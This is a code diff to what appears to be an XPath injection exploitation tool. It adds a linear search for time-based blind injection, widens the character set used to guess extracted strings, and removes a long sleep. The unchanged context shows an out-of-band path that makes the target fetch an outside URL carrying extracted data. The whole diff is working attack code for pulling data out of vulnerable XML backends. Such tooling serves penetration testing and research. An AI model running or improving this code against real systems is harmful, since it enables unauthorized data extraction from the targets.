@@ -9,7 +9,7 @@ from .display import XMLNode
 
 fs_func = Functions('Q{http://expath.org/ns/file}')
 
-ASCII_SEARCH_SPACE = stdlib_string.digits + stdlib_string.ascii_letters + '+./:@_ -,()!'
+ASCII_SEARCH_SPACE = stdlib_string.digits + stdlib_string.ascii_letters + stdlib_string.punctuation + ' '
 MISSING_CHARACTER = "?"
 
 
@@ -18,6 +18,11 @@ async def count(context: AttackContext, expression, count_func=func.count):
         result = await get_string_via_oob(context, func.string(count_func(expression)))
         if result is not None and result.isdigit():
             return int(result)
+
+    if context.time_based:
+        # Linear search: faster for time-based because only 1 true (slow)
+        # result vs binary search's ~log2(N)/2 true results
+        return await linear_search(context, count_func(expression))
 
     return await binary_search(context, count_func(expression), min=0)
 
@@ -104,7 +109,6 @@ async def get_string_via_oob(context: AttackContext, expression):
     url_expr = func.concat(url, func.encode_for_uri(expression))
     oob_expr = func.doc(url_expr) / 'data' == context.oob_app['test_response_value']
     if not await check(context, oob_expr):
-        await asyncio.sleep(10000)
         return None
 
     try:
@@ -141,6 +145,18 @@ async def get_node_comments(context: AttackContext, expression):
     comments_count = await count(context, expression.comments)
     futures = [get_string(context, comment) for comment in expression.comments(comments_count)]
     return await asyncio.gather(*futures)
+
+
+async def linear_search(context: AttackContext, expression, max_val=200):
+    """Linear search: check =0, =1, =2, ... until match.
+
+    Faster than binary search for time-based injection because only the
+    matching check is true (slow) while all others are false (fast).
+    """
+    for n in range(max_val + 1):
+        if await check(context, expression == n):
+            return n
+    return -1
 
 
 async def binary_search(context: AttackContext, expression, min, max=25):
